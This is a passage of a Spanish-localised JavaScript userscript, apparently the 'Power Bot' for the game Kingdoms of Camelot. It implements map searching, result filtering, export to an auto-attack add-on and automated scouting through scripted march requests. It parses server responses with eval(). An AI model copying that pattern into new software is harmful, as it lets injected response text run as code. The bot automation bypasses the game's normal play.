    		  document.getElementById ('pasrchY').value = Provinces[this.value].y;
    		  document.getElementById ('pasrcDist').value = '75';
    	  }
	    }, false);
	document.getElementById('pbsrcdist').addEventListener ('change', function (){
      Options.srcdisttype = document.getElementById('pbsrcdist').value;
      saveOptions();
      }, false);
    document.getElementById ('pasrcStart').addEventListener ('click', t.clickedSearch, false);
    document.getElementById ('pasrchX').addEventListener ('keydown', t.e_coordChange, false);
    document.getElementById ('pasrchY').addEventListener ('keydown', t.e_coordChange, false);
    document.getElementById ('pasrcDist').addEventListener ('keydown', t.e_coordChange, false);
    document.getElementById ('pasrchY').addEventListener ('change', t.e_coordChange, false);
    document.getElementById ('pasrchY').addEventListener ('change', t.e_coordChange, false);
    unsafeWindow.pbSearchLookup = t.clickedLookup;  
    unsafeWindow.pbSearchScout = t.clickedScout;
    unsafeWindow.pbExportToRaid = t.ExportToRaid;
  },

  e_coordChange : function(){
    document.getElementById ('provinceXY').selectedIndex = 0;
  },
  
  hide : function (){
  },

  show : function (cont){
  },

  citySelNotify : function (city){
    var t = Tabs.Search;
    t.selectedCity = city;
    t.JumpCity(city.name);
  },
  
  JumpCity:function(city) {
    var t = Tabs.Search;
	for (i=0;i<Seed.cities.length;i++) {
		if (Seed.cities[i][1]==city) var cityNum=i;
	}
	cityNum++;
	var obj = document.getElementById('citysel_'+cityNum);
  	return t.ClickWin(window,obj,'click');
  },
  
  ClickWin:function(win,obj,evtName) {
  	var evt = win.document.createEvent("MouseEvents");
  	evt.initMouseEvent(evtName, true, true, win,
  		0, 0, 0, 0, 0, false, false, false, false, 0, null);
  	return !obj.dispatchEvent(evt);
  },
  
  helpPop : function (){
       var helpText = 'El número de tropas (segun KOC WIKI):<BR>';
       helpText += '<A target="_tab" href="http://koc.wikia.com/wiki/Barbarian_Camps">Se puede encontrar más infirmación en Koc Wikia</a>';
       helpText += '<TABLE><TR><TD>Lvl</td><TD>Tropas</td></tr>';
       helpText += '<TR><TD>1</td><TD>500 Tro. Sumu. + 500 Arqueros</td></tr>';
       helpText += '<TR><TD>2</td><TD>500 Tro. Sumu. + 2500 Arqueros</td></tr>';
       helpText += '<TR><TD>3</td><TD>500 Tro. Sumu. + 5000 Arqueros</td></tr>';
       helpText += '<TR><TD>4</td><TD>500 Tro. Sumu. + 7500 Arqueros</td></tr>';
       helpText += '<TR><TD>5</td><TD>15000 Arqueros</td></tr>';
       helpText += '<TR><TD>5</td><TD>12000 Arqueros con nivel 10 flechas y nivel 9 peso pluma</td></tr>';
       helpText += '<TR><TD>6</td><TD>25000 Arqueros con nivel 9 flechas</td></tr>';
       helpText += '<TR><TD>6</td><TD>22000 Arqueros con nivel 10 flechas</td></tr>';
       helpText += '<TR><TD>7</td><TD>45000 Arqueros con nivel 10 flechas</td></tr>';
       helpText += '<TR><TD>7</td><TD>44000 Arqueros con nivel 10 flechas y caballero 69+</td></tr>';
       helpText += '<TR><TD>7</td><TD>40000 Arqueros con nivel 10 flechas y caballero 94+</td></tr>';
       helpText += '<TR><TD>8</td><TD>28000 Ballistas con nivel 10 flechas y caballero 91+</td></tr>';
       helpText += '<TR><TD>9</td><TD>56000 Ballistas WITH Level 10 flechas y caballero 98+</td></tr>';
       helpText += '<TR><TD>10</td><TD>100.000 Catapultas + 50.000 Ballistas</td></tr></tr></table>';

       var pop = new CPopup ('giftHelp', 0, 0, 425, 375, true);
       pop.centerMe (mainPop.getMainDiv());
       pop.getMainDiv().innerHTML = helpText;
       pop.getTopDiv().innerHTML = '<CENTER><B>Ayuda de Power Bot: Busqueda</b></center>';
       pop.show (true);
  },
     
     
  opt : {},
  selectedCity : null,
  searchRunning : false,
  tilesSearched : 0,
  tilesFound : 0,
  curX : 0,
  curY : 0,
  lastX : 0,
  firstX : 0,
  firstY : 0,
  lastY : 0,

  clickedSearch : function (){
    var t = Tabs.Search;

    if (t.searchRunning){
      t.stopSearch ('BUSQUEDA CANCELADA!');
      return;
    }
    t.opt.searchType = document.getElementById ('pasrcType').value;
    t.opt.startX = parseInt(document.getElementById ('pasrchX').value);
    t.opt.startY = parseInt(document.getElementById ('pasrchY').value);
    t.opt.maxDistance = parseInt(document.getElementById ('pasrcDist').value);
    t.opt.searchShape = Options.srcdisttype;
    errMsg = '';

    if (isNaN (t.opt.startX) ||t.opt.startX<0 || t.opt.startX>749)
      errMsg = "X debe estar entre 0 y 749<BR>";
    if (isNaN (t.opt.startY) ||t.opt.startY<0 || t.opt.startY>749)
      errMsg += "Y debe estar entre 0 y 749<BR>";
    if (isNaN (t.opt.maxDistance) ||t.opt.maxDistance<1 || t.opt.maxDistance>75)
      errMsg += "El radio (distancia) debe estar entre 1 y 75<BR>";
    if (errMsg != ''){
      document.getElementById('pasrcResults').innerHTML = '<FONT COLOR=#660000>ERROR:</font><BR><BR>'+ errMsg;
      return;
    }

    t.searchRunning = true;
    document.getElementById ('pasrcStart').value = 'Parar Busqueda';
    m = '<DIV class=pbStat><TABLE width=100% cellspacing=0><TR><TD class=xtab width=125><DIV id=pastatSearched></div></td>\
        <TD class=xtab align=center><SPAN style="white-space:normal" id=pastatStatus></span></td>\
        <TD class=xtab align=right width=125><DIV id=pastatFound></div></td></tr></table></div>\
          <TABLE width=100%><TR valign=top>\
            <TD width=99% style="max-width:50px"><DIV id=padivOutTab style="height:380px; max-height:380px; overflow-y:auto;"></div></td>\
            <TD align=center valign=middle><A id=pbAhideShow style="text-decoration:none; cursor:pointer;"><DIV style="width:1em; border:1px solid red; padding:10px 2px; background-color:#fee"><SPAN id=spanHideShow> O C U L T A R</span><BR><BR> L<BR>I<BR>S<BR>T<BR>A<BR><BR> O<BR>P<BR>C<BR>I<BR>O<BR>N<BR>E<BR>S </div></a></td>\
            <TD width=100% height=100% style="background:#e0e0f0; height:100%; padding:5px"><DIV id=padivOutOpts></div></td>\
          </table>';
      
    document.getElementById('pasrcResults').innerHTML = m;
    if (t.opt.searchType == 0)
      var typeName = 'Barbaros';
    else if (t.opt.searchType == 1)
      var typeName = 'Tierras';
    else
      var typeName = 'Ciudades';
    if (t.opt.searchShape == 'square')
      var distName = 'Distancia';
    else
      var distName = 'Radio';
    m = '<CENTER><B>Buscar por '+ typeName +'<BR>\
        Center: '+ t.opt.startX +','+ t.opt.startY +'  &nbsp; '+ distName +': '+ t.opt.maxDistance +'<BR></center>\
        <DIV class=ptentry><TABLE cellspacing=0 width=100%><TR align=center><TD class=xtab colspan=10><B>LISTA DE OPCIONES:</b><BR></td></tr>';
        
    if (t.opt.searchType == 1 || t.opt.searchType == 0) {
      m += '<TR><TD class=xtab align=right>Min. nivel a buscar:</td><TD class=xtab> <INPUT id=pafilMinLvl size=2 value='+ Options.srcMinLevel +' /></td></tr>\
        <TR><TD class=xtab align=right>Max. nivel a buscar:</td><TD class=xtab> <INPUT id=pafilMaxLvl size=2 value='+ Options.srcMaxLevel +' /></td></tr>';
		}
    if (t.opt.searchType == 1){
      m += '<TR><TD class=xtab align=right>Tipo de Tierras:</td><TD class=xtab><SELECT id=pafilWildType>';
      m += htmlOptions ( {1:'Praderas/Lagos', 3:'Bosques', 4:'Colinas', 5:'Montañas', 6:'Planicies', 0:'TODAS'}, Options.wildType );
      m+= '</select></td></tr>';
	  m+= '<TR><TD class=xtab align=right>Praderas/Lagos:</td><TD class=xtab><INPUT name=pbfil id=pafilGrass type=CHECKBOX '+ (Options.GrassOnly?' CHECKED':'') +'\><td></tr>';
	  m+= '<TR><TD class=xtab align=right>Bosques:</td><TD class=xtab><INPUT name=pbfil id=pafilWood type=CHECKBOX '+ (Options.WoodOnly?' CHECKED':'') +'\><td></tr>';
	  m+= '<TR><TD class=xtab align=right>Colinas:</td><TD class=xtab><INPUT name=pbfil id=pafilHill type=CHECKBOX '+ (Options.HillOnly?' CHECKED':'') +'\><td></tr>';
	  m+= '<TR><TD class=xtab align=right>Montañas:</td><TD class=xtab><INPUT name=pbfil id=pafilMount type=CHECKBOX '+ (Options.MountOnly?' CHECKED':'') +'\><td></tr>';
	  m+= '<TR><TD class=xtab align=right>Planicies:</td><TD class=xtab><INPUT name=pbfil id=pafilPlain type=CHECKBOX '+ (Options.PlainOnly?' CHECKED':'') +'\><td></tr>';
	  m+= '<TR><TD class=xtab align=right>TODAS:</td><TD class=xtab><INPUT name=pbfil id=pafilAll type=CHECKBOX '+ (Options.srcAll?' CHECKED':'') +'\><td></tr>';
	  m += '</select></td></tr><TR><TD class=xtab align=right>Solo Desconocidos:</td><TD class=xtab><INPUT id=pafilUnowned type=CHECKBOX '+ (Options.unownedOnly?' CHECKED':'') +'\><td></tr>';
    }
   if (t.opt.searchType == 1 || t.opt.searchType == 0) {
        m+= '<TR><TD class=xtab align=right>Ordenar por:</td><TD class=xtab><SELECT id=pafilSortBy>\
          <OPTION value="level" '+ (Options.srcSortBy=='level'?'SELECTED':'')  +'>Nivel</option>\
          <OPTION value="dist" '+ (Options.srcSortBy=='dist'?'SELECTED':'')  +'>Distancia</option>\
        </select></td></tr>\
			<TR><TD class=xtab align=right>Solo Coordenadas:</td><TD class=xtab><INPUT type=checkbox id=pacoordsOnly \></td></tr>\
			</table></div><BR><SPAN id=pasrchSizeWarn></span><DIV id=pbSrcExp></div>';
    } else {
		m+= '</select></td></tr><TR><TD class=xtab align=right>Niebla:</td><TD class=xtab><INPUT name=pbfil id=pafilMisted type=CHECKBOX '+ (Options.mistedOnly?' CHECKED':'') +'\><td></tr>';
		m+= '<TR><TD class=xtab align=right>Hostiles:</td><TD class=xtab><INPUT name=pbfil id=pafilHostile type=CHECKBOX '+ (Options.hostileOnly?' CHECKED':'') +'\><td></tr>';
		m+= '<TR><TD class=xtab align=right>Amigables:</td><TD class=xtab><INPUT name=pbfil id=pafilFriendly type=CHECKBOX '+ (Options.friendlyOnly?' CHECKED':'') +'\><td></tr>';
		m+= '<TR><TD class=xtab align=right>Aliados:</td><TD class=xtab><INPUT name=pbfil id=pafilAllied type=CHECKBOX '+ (Options.alliedOnly?' CHECKED':'') +'\><td></tr>';
		m+= '<TR><TD class=xtab align=right>Neutrales:</td><TD class=xtab><INPUT name=pbfil id=pafilNeutral type=CHECKBOX '+ (Options.neutralOnly?' CHECKED':'') +'\><td></tr>';
		m+= '<TR><TD class=xtab align=right>No Aliados:</td><TD class=xtab><INPUT name=pbfil id=pafilunAllied type=CHECKBOX '+ (Options.unalliedOnly?' CHECKED':'') +'\><td></tr>';
		m+= '<TR><TD class=xtab align=right>todos:</td><TD class=xtab><INPUT name=pbfil id=pafilAll type=CHECKBOX '+ (Options.srcAll?' CHECKED':'') +'\><td></tr>';
		m+= '<TR><TD class=xtab align=right>Ordenar por:</td><TD class=xtab><SELECT id=pafilSortBy>\
    <OPTION value="might" '+ (Options.srcSortBy=='might'?'SELECTED':'')  +'>Poderio</option>\
             <OPTION value="dist" '+ (Options.srcSortBy=='dist'?'SELECTED':'')  +'>Distancia</option>\
    </select></td></tr>\
    <TR><TD class=xtab align=right>Min. Poderio:</td><TD class=xtab><INPUT type=text id=paminmight size=6 value='+ Options.minmight +'>\
    <TR><TD class=xtab align=right>Solo Coordenadas</td><TD class=xtab><INPUT type=checkbox id=pacoordsOnly \></td></tr>\
        </table></div><BR><SPAN id=pasrchSizeWarn></span><DIV id=pbSrcExp></div>';
	
	}
    document.getElementById('padivOutOpts').innerHTML = m;
	 if (t.opt.searchType == 1 || t.opt.searchType == 0) {
    document.getElementById('pafilMinLvl').addEventListener ('change', function (){
      Options.srcMinLevel = document.getElementById('pafilMinLvl').value;
      saveOptions();
      t.dispMapTable ();
      }, false);
    document.getElementById('pafilMaxLvl').addEventListener ('change', function (){
      Options.srcMaxLevel = document.getElementById('pafilMaxLvl').value;
      saveOptions();
      t.dispMapTable ();
      }, false);
	  }
    document.getElementById('pafilSortBy').addEventListener ('change', function (){
      Options.srcSortBy = document.getElementById('pafilSortBy').value;
      saveOptions();
      t.dispMapTable ();
      }, false);
    document.getElementById('pacoordsOnly').addEventListener ('change', function (){ t.dispMapTable (); }, false);
    if (t.opt.searchType == 1){
      document.getElementById('pafilWildType').addEventListener ('change', function (){
        Options.wildType = document.getElementById('pafilWildType').value;
        saveOptions();
        t.dispMapTable ();
        }, false);
      document.getElementById('pafilUnowned').addEventListener ('change', function (){
        Options.unownedOnly = (document.getElementById('pafilUnowned').checked);
        saveOptions();
        t.dispMapTable ();
        }, false);
    }
	if (t.opt.searchType == 2){
		document.getElementById('pafilMisted').addEventListener ('change', function (){
        Options.mistedOnly = (document.getElementById('pafilMisted').checked);
		if(!Options.mistedOnly){
			document.getElementById('pafilAll').checked = false;
			Options.srcAll = Options.mistedOnly;
		}
        saveOptions();
        t.dispMapTable ();
        }, false);
		document.getElementById('pafilHostile').addEventListener ('change', function (){
        Options.hostileOnly = (document.getElementById('pafilHostile').checked);
		if(!Options.hostileOnly){
			document.getElementById('pafilAll').checked = false;
			Options.srcAll = Options.hostileOnly;
		}
        saveOptions();
        t.dispMapTable ();
        }, false);
		document.getElementById('pafilFriendly').addEventListener ('change', function (){
        Options.friendlyOnly = (document.getElementById('pafilFriendly').checked);
		if(!Options.friendlyOnly){
			document.getElementById('pafilAll').checked = false;
			Options.srcAll = Options.friendlyOnly;
		}
        saveOptions();
        t.dispMapTable ();
        }, false);
		document.getElementById('pafilAllied').addEventListener ('change', function (){
        Options.alliedOnly = (document.getElementById('pafilAllied').checked);
		if(!Options.alliedOnly){
			document.getElementById('pafilAll').checked = false;
			Options.srcAll = Options.alliedOnly;
		}
        saveOptions();
        t.dispMapTable ();
        }, false);
		document.getElementById('pafilNeutral').addEventListener ('change', function (){
        Options.neutralOnly = (document.getElementById('pafilNeutral').checked);
		if(!Options.neutralOnly){
			document.getElementById('pafilAll').checked = false;
			Options.srcAll = Options.neutralOnly;
		}
        saveOptions();
        t.dispMapTable ();
        }, false);
		document.getElementById('pafilunAllied').addEventListener ('change', function (){
        Options.unalliedOnly = (document.getElementById('pafilunAllied').checked);
		if(!Options.unalliedOnly){
			document.getElementById('pafilAll').checked = false;
			Options.srcAll = Options.unalliedOnly;
		}
        saveOptions();
        t.dispMapTable ();
        }, false);
		document.getElementById('pafilAll').addEventListener ('change', function (){
        Options.srcAll = (document.getElementById('pafilAll').checked);
		for(i in document.getElementsByName('pbfil'))
			document.getElementsByName('pbfil')[i].checked = Options.srcAll;
		Options.mistedOnly=Options.hostileOnly=Options.friendlyOnly=Options.alliedOnly=Options.neutralOnly=Options.unalliedOnly=Options.srcAll;
        saveOptions();
        t.dispMapTable ();
        }, false);
		document.getElementById('paminmight').addEventListener ('change', function (){
        Options.minmight = parseIntNan(document.getElementById('paminmight').value);
        saveOptions();
        t.dispMapTable ();
        }, false);
	
	}
	
    document.getElementById('pbAhideShow').addEventListener ('click', t.hideShowClicked, false);
	
    t.mapDat = [];
    t.firstX =  t.opt.startX - t.opt.maxDistance;
    t.lastX = t.opt.startX + t.opt.maxDistance;
    t.firstY =  t.opt.startY - t.opt.maxDistance;
    t.lastY = t.opt.startY + t.opt.maxDistance;
    t.tilesSearched = 0;
    t.tilesFound = 0;
    t.curX = t.firstX;
    t.curY = t.firstY;
    var xxx = t.MapAjax.normalize(t.curX);
    var yyy = t.MapAjax.normalize(t.curY);
    document.getElementById ('pastatStatus').innerHTML = 'Buscando en '+ xxx +','+ yyy;
    setTimeout (function(){t.MapAjax.request (xxx, yyy, 15, t.eventgetplayeronline)}, MAP_DELAY);
  },

  hideShowClicked : function (){
    var div = document.getElementById('padivOutOpts');
    if (div.style.display == 'none'){
      div.style.display = 'block';
      document.getElementById('spanHideShow').innerHTML = 'O C U L T A R';
    } else {
      div.style.display = 'none';
      document.getElementById('spanHideShow').innerHTML = 'M O S T R A R';
    }
  },
  
  dispMapTable : function (){
    var tileNames = ['Barbaros', 'Praderas', 'Lagos', 'Bosques', 'Colinas', 'Montañas', 'Planicies' ];
    var t = Tabs.Search;
    var coordsOnly = document.getElementById('pacoordsOnly').checked;
    if (DEBUG_SEARCH) DebugTimer.start();
     function mySort(a, b){
      if (Options.srcSortBy == 'level'){
        if ((x = a[4] - b[4]) != 0)
          return x;
      }
	  if (Options.srcSortBy == 'might'){
        if ((x = b[10] - a[10]) != 0)
          return x;
      }
      return a[2] - b[2];
    }
	
    dat = [];
    for (i=0; i<t.mapDat.length; i++){
      lvl = parseInt (t.mapDat[i][4]);
      type = t.mapDat[i][3];
      if (t.opt.searchType==2 && type==7 ) {
		if(t.mapDat[i][10] >= Options.minmight || t.mapDat[i][5])
		if((Options.hostileOnly && t.mapDat[i][12] == 'h') ||
		   (Options.mistedOnly && t.mapDat[i][5]===true) ||
		   (Options.friendlyOnly && t.mapDat[i][12] == 'f') ||
		   (Options.alliedOnly && t.mapDat[i][12] == 'a') ||
		   (Options.neutralOnly && t.mapDat[i][12] == 'n') ||
		   (Options.unalliedOnly && t.mapDat[i][12] == 'u') ||
		   (Options.srcAll))
				dat.push(t.mapDat[i]);
      } else {
       if (lvl>=Options.srcMinLevel && lvl<=Options.srcMaxLevel){
        if (t.opt.searchType==0 || Options.wildType==0
        ||  (Options.wildType==1 && (type==1 || type==2))
        ||  (Options.wildType == type)){
          if (!Options.unownedOnly || t.mapDat[i][5]===false)
            dat.push (t.mapDat[i]);
        }
       }
	  }
    }
    if (DEBUG_SEARCH) DebugTimer.display('SEACHdraw: FILTER');

    document.getElementById('pastatFound').innerHTML = 'Encontrados: '+ dat.length;
    if (dat.length == 0){
      m = '<BR><CENTER>Analizando mapa...</center>';
    } else {
      dat.sort(mySort);
      if (DEBUG_SEARCH) DebugTimer.display('SEACHdraw: SORT');
      if (coordsOnly)
        m = '<TABLE align=center id=pasrcOutTab cellpadding=0 cellspacing=0><TR style="font-weight: bold"><TD>Ubicación</td></tr>';
      else {
      if (t.opt.searchType == 2) {
			m = '<TABLE id=pasrcOutTab class=pbSrchResults cellpadding=0 cellspacing=0><TR style="font-weight: bold"><TD>Ubicación</td><TD align=right>Distancia</td><TD>Jugador</td><TD align=right>Poderio</td><TD>Alianza</td><TD>Online</td><TD></td></tr>';
		} else {
			m = '<TABLE id=pasrcOutTab cellpadding=0 cellspacing=0><TR style="font-weight: bold"><TD>Ubicación</td><TD style="padding-left: 10px">Distancia</td><TD style="padding-left: 10px;">Lvl</td><TD width=100px> &nbsp; Tipo</td><TD></td><TD>Exportar a Raid</td></tr>';
		}
	}
      var numRows = dat.length;
      if (numRows > t.MAX_SHOW_WHILE_RUNNING && t.searchRunning){
        numRows = t.MAX_SHOW_WHILE_RUNNING;
        document.getElementById('pasrchSizeWarn').innerHTML = '<FONT COLOR=#600000>NOTE: La Tabla solo muestra '+ t.MAX_SHOW_WHILE_RUNNING +' de '+ dat.length +' resultados hasta que se complete la búsqueda .</font>';
       }
      for (i=0; i<numRows; i++){
        m += '<TR><TD><DIV onclick="pbGotoMap('+ dat[i][0] +','+ dat[i][1] +')"><A>'+ dat[i][0] +','+ dat[i][1] +'</a></div></td>';
        if (coordsOnly) {
          m += '</tr>';
        } else {
          if (t.opt.searchType == 2) { // city search
            m += '<TD align="right" >'+ dat[i][2].toFixed(2) +'</td>';
            if (dat[i][5])
               m += '<TD colspan=4>* NIEBLA * &nbsp; &nbsp; <SPAN onclick="pbSearchScout('+ dat[i][0] +','+ dat[i][1] +');return false;"><A>Explorar</a></span></td></tr>';
         else {
              var allStyle = '';
              if (dat[i][12]=='f')
                allStyle = 'class=pbTextFriendly';
              else if (dat[i][12]=='h')
                allStyle = 'class=pbTextHostile';
              m += '<TD>'+ dat[i][9]+'</td><TD align=right>'+ dat[i][10] +'</td><TD><SPAN '+ allStyle +'>'+ dat[i][11]+'</span></td><TD>'+(dat[i][13]?'<SPAN class=boldDarkRed>ONLINE</span>':'')+'</td><TD><A onclick="pbSearchLookup('+ dat[i][7] +')">Buscar</a></td></tr>';
			 }
			} else {
          m += '<TD align=right  valign="top">'+ dat[i][2].toFixed(2) +' &nbsp; </td><TD align=right>'+ dat[i][4] +'</td><TD> &nbsp; '+ tileNames[dat[i][3]]
            +'</td><TD  valign="top">'+ (dat[i][5]?(dat[i][6]!=0?' <A onclick="pbSearchLookup('+dat[i][6]+')">DUEÑO</a>':'<A onclick="pbSearchScout('+ dat[i][0] +','+ dat[i][1] +');return false;">NIEBLA</a>'):'') +'</td>';
          if (t.opt.searchType == 0) m+= '<TD align=center  valign="top"><A onclick="pbExportToRaid('+ dat[i][0]+','+dat[i][1] +')">Exportar</a></td>';
          m+='</tr>';
			}
		}
			
       }
      m += '</table>';
    }
    document.getElementById('padivOutTab').innerHTML = m;
    dat = null;
    if (DEBUG_SEARCH) DebugTimer.display('SEACHdraw: DRAW');
  },

  mapDat : [],

  stopSearch : function (msg){
    var t = Tabs.Search;
    document.getElementById ('pastatStatus').innerHTML = '<FONT color=#ffaaaa>'+ msg +'</font>';
    document.getElementById ('pasrcStart').value = 'Iniciar Busqueda';
    document.getElementById ('pasrchSizeWarn').innerHTML = '';
    if (t.opt.searchType==0 && document.getElementById('KOCAttackToggle')!=null){    
      document.getElementById ('pbSrcExp').innerHTML = '<CENTER>'+ strButton20('Exportar Resultados', 'id=pbSrcDoExp') +'</center><TR><TD>NOTA: Con el boton exportar, podras como su nombre dice enviar las coordenadas localizadas en el buscador al Autoataque. Este sistema solo funciona con el KOCAttack - Extra Features creado por "niknah. Para exportarlas solo tienes que seguir sus pasos y las coordenadas, junto con los datos de tropa que en la siguiente ventana configuraras, despues solo tienes que activar el autoataques".</td></tr>';
      document.getElementById ('pbSrcDoExp').addEventListener ('click', t.exportKOCattack, false);
    }
	if (t.opt.searchType==2){
	  document.getElementById ('pbSrcExp').innerHTML = '<CENTER>'+ strButton20('Generar lista de exploración', 'id=pbSrcDoScout') +'</center>';
      document.getElementById ('pbSrcDoScout').addEventListener ('click', t.generateScoutList, false);
	}
    t.searchRunning = false;
    t.dispMapTable();
  },

  exportKOCattack : function (){
    var t = Tabs.Search;
    var bulkAdds = {};
    for (i=1; i<11; i++)
      bulkAdds['lvl'+ i] = [];
    for (i=0; i<t.mapDat.length; i++){
      var lvl = parseInt (t.mapDat[i][4]);
      if (lvl>=Options.srcMinLevel && lvl<=Options.srcMaxLevel && t.mapDat[i][3]==0)
        bulkAdds['lvl'+ lvl].push({x:t.mapDat[i][0], y:t.mapDat[i][1]});
    }
    exportToKOCattack.doExport (bulkAdds, t.selectedCity);
  },
  
  generateScoutList : function (){
    var t = Tabs.Search;
    var bulkScout = [];
    for (i=0; i<t.mapDat.length; i++){
      if (t.mapDat[i][3] == 7){
		if(t.mapDat[i][10] >= Options.minmight || t.mapDat[i][5]){
		if((Options.hostileOnly && t.mapDat[i][12] == 'h') ||
		   (Options.mistedOnly && t.mapDat[i][5]===true) ||
		   (Options.friendlyOnly && t.mapDat[i][12] == 'f') ||
		   (Options.alliedOnly && t.mapDat[i][12] == 'a') ||
		   (Options.neutralOnly && t.mapDat[i][12] == 'n') ||
		   (Options.unalliedOnly && t.mapDat[i][12] == 'u') ||
		   (Options.srcAll))
			bulkScout.push({x:t.mapDat[i][0], y:t.mapDat[i][1], dist:t.mapDat[i][2]});
		}
	  }
    }
	if(t.selectedCity == null)
		t.selectedCity = Cities.cities[0];
    t.ShowScoutList (bulkScout, t.selectedCity);
  },
  ShowScoutList : function (coordlist, city){
	var t = Tabs.Search;
	var popScout = null;
	t.scoutcity = city;
	
	if(popScout==null){
	  popScout = new CPopup ('pbsrcscout', 0,0, 350,500, true, function (){popScout.destroy(); popScout=null;});
      popScout.centerMe (mainPop.getMainDiv());  
    }
	var m = '<DIV class=pbStat>Opciones de auto exploración</div>';
		m += '<DIV>Cantidad de Exploradores a enviar: <input id=pbsrcScoutAmt value="'+Options.srcScoutAmt+'" /></div><BR>';
		m += '<DIV>Seleccionar Ciudad: <span id=pbsrcScoutcitypick> </span></div><BR>';
		m += '<DIV class=pbStat>Exploradores desde <span id=pbsrcScoutcity>'+city.name+'</span> <BR> Objetivos totales '+coordlist.length+'</div>';
		m += '<DIV style="max-height:220px; overflow-y:auto;"><TABLE align=center cellpadding=0 cellspacing=0 class=pbTabPadNW><TR style="font-weight:bold; background-color:white"><TD width=15><input type=checkbox id=pbsrcScout_All /></td><TD>Coordenadas Objetivos</td></tr>';
	  for(i=0; i<coordlist.length; i++){
			m += '<TR style="background-color:white"><TD><input type=checkbox name=pbsrcScoutCheck id="pbsrcScoutCheck_'+coordlist[i].x+'_'+coordlist[i].y+'" value="'+coordlist[i].x+'_'+coordlist[i].y+'" /></td><TD>'+coordLink(coordlist[i].x,coordlist[i].y)+'</td></tr>';
	  }
	    m += '</table></div>';
		m += '<BR><CENTER>'+ strButton20('Iniciar exploracion', 'id=pbSrcStartScout') +'</center>';
		m += '<CENTER><DIV style="width:70%; max-height:75px; overflow-y:auto;" id=pbSrcScoutResult></DIV></center>';
	popScout.getMainDiv().innerHTML = m;
	new CdispCityPicker ('pbScoutPick', document.getElementById('pbsrcScoutcitypick'), false, function(c,x,y){document.getElementById('pbsrcScoutcity').innerHTML = c.name; t.scoutcity = c; }, city.idx);
	popScout.getTopDiv().innerHTML = '<CENTER><B>Lista de exploracion de Power Bot</b></center>';
	popScout.show(true);
	
	document.getElementById('pbsrcScoutAmt').addEventListener('change', function(){
		Options.srcScoutAmt = parseInt(document.getElementById('pbsrcScoutAmt').value);
		saveOptions();
	}, false);
	document.getElementById('pbsrcScout_All').addEventListener('change', function(){
		for(k in document.getElementsByName('pbsrcScoutCheck'))
			document.getElementsByName('pbsrcScoutCheck')[k].checked = document.getElementById('pbsrcScout_All').checked;
	}, false);
	document.getElementById('pbSrcStartScout').addEventListener('click', t.clickedStartScout, false);
  },
  scouting : false,
  scoutcity : null,
  doScout : function(list, city){
	var t = Tabs.Search;
	document.getElementById('pbSrcScoutResult').innerHTML = '';
	if(list.length < 1){
		document.getElementById('pbSrcScoutResult').innerHTML = '<SPAN class=boldRed>ERROR: No hay coordenadas seleccionadas</span>';
		t.clickedStartScout();
		return;
	}
	if(parseInt(Seed.units['city'+city.id]['unt'+3]) < Options.srcScoutAmt){
		document.getElementById('pbSrcScoutResult').innerHTML = '<SPAN class=boldRed>ERROR: No hay exploradores disponibles</span>';
		t.clickedStartScout();
		return;
	}
	t.doScoutCount(list, city, list.length, 0);
	
  },
  doScoutCount : function(list, city, total, count){
	var t = Tabs.Search;
	if(!t.scouting){
		document.getElementById('pbSrcScoutResult').innerHTML += '<SPAN class=boldRed>Exploraciones paradas por el usuario</span><BR>';
		document.getElementById('pbSrcStartScout').className = 'button20 ptButton20';
		document.getElementById('pbSrcStartScout').innerHTML = '<SPAN>Iniciar exploración</span>';
		return;
	}
	if(total <= (count)){
		document.getElementById('pbSrcScoutResult').innerHTML += 'Hecho!<BR>';
		t.clickedStartScout();
		return;
	}
	var rallypointlevel = t.getRallypoint(city.id);
	var slots = 0;
       for (z in Seed.queue_atkp['city'+city.id]){
             slots++;
       }
    if  (Seed.queue_atkp['city'+city.id].toSource() == "[]") slots=0;

	if(slots >= rallypointlevel){
		setTimeout(function(){t.doScoutCount(list, city, total, count)}, 5000);
		document.getElementById('pbSrcScoutResult').innerHTML += 'Esperando limpiar el punto de Reunión...';
		return;
	}
	var coords = list[count].split("_");
	if(coords[0] == 'undefined' || coords[1] == 'undefined'){
		document.getElementById('pbSrcScoutResult').innerHTML += '<SPAN class=boldRed>ERROR: Coordenadas no validas</span>';
		t.clickedStartScout();
		return;
	}
	document.getElementById('pbSrcScoutResult').innerHTML += 'Enviando exploracion a '+coords[0]+','+coords[1]+'...';
	document.getElementById('pbsrcScoutCheck_'+coords[0]+'_'+coords[1]).checked = false;
	t.sendScout(coords[0], coords[1], city, count, function(c){t.doScoutCount(list, city, total, c)});
  },
  sendScout : function(x, y, city, count, notify){
	var t = Tabs.Search;
	count = parseInt(count);
	var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
    params.cid = city.id;
	params.kid = 0;
	params.type = 3;
	params.xcoord = x;
	params.ycoord = y;
	params.u3 = Options.srcScoutAmt;
	new AjaxRequest(unsafeWindow.g_ajaxpath + "ajax/march.php" + unsafeWindow.g_ajaxsuffix, {
		 method: "post",
		 parameters: params,
		 loading: true,
		 onSuccess: function (rslt) {
		 rslt = eval("(" + rslt.responseText + ")");
		 if (rslt.ok) {
			 var timediff = parseInt(rslt.eta) - parseInt(rslt.initTS);
			 var ut = unixTime();
			 var unitsarr=[0,0,0,0,0,0,0,0,0,0,0,0,0];
			 var resources=[0,0,0,0,0,0,0,0,0,0,0,0,0];
			 for(i = 0; i <= unitsarr.length; i++){
				if(params["u"+i]){
				unitsarr[i] = params["u"+i];
				}
			 }
			 var currentcityid = params.cid;
			 unsafeWindow.attach_addoutgoingmarch(rslt.marchId, rslt.marchUnixTime, ut + timediff, params.xcoord, params.ycoord, unitsarr, params.type, params.kid, resources, rslt.tileId, rslt.tileType, rslt.tileLevel, currentcityid, true);
			 if(rslt.updateSeed){unsafeWindow.update_seed(rslt.updateSeed)};
			 document.getElementById('pbSrcScoutResult').innerHTML += 'Enviado!<BR>';
			 if (notify)
			  setTimeout(function(){ notify(count+1); }, 1000);
		 } else {
			 document.getElementById('pbSrcScoutResult').innerHTML += 'Fallo! reintentando....<BR>';
			 if (notify)
			  setTimeout(function(){ notify(count); }, 1000);
		  }
		},
		onFailure: function () {}
  		});
  },
  getRallypoint: function(cityId){
      var t = Tabs.Search;
	  cityId = 'city'+cityId;
      for (o in Seed.buildings[cityId]){
		var buildingType = parseInt(Seed.buildings[cityId][o][0]);
		var buildingLevel = parseInt(Seed.buildings[cityId][o][1]);
		if (buildingType == 12){
			return parseInt(buildingLevel);
			break;
		}
	   }
	  return 0;
    },
	clickedStartScout : function(){
	var t = Tabs.Search;
		if(t.scouting == false){
			t.scouting = true;
